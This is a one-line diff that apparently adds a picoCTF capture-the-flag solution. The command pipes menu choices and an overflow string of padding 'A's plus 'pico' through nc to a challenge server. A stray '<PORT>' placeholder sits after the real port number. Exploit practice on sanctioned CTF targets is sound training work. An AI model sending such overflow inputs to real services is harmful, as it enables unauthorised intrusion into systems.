@@ -1,0 +1,1 @@
+echo -ne '5\n2\n36\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico\n4\n3' | nc tethys.picoctf.net 62574 <PORT>
